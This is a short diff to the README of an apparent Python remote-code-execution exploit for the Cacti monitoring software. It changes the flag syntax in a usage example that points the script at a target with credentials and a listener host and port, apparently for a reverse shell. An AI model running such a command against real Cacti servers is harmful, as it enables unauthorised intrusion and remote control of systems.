@@ -10,7 +10,7 @@ Remote Code Exectuion of Cacti using Python
 
 * Using python3
 ```
-python3 cacti.py -t http://exploitcacti.blah -u username -p password --lhost 10.10.10.1 --lport 1337
+python3 cacti.py -t http://exploitcacti.blah -u username -p password -lhost 10.10.10.1 -lport 1337
 ```
 
 ## Help
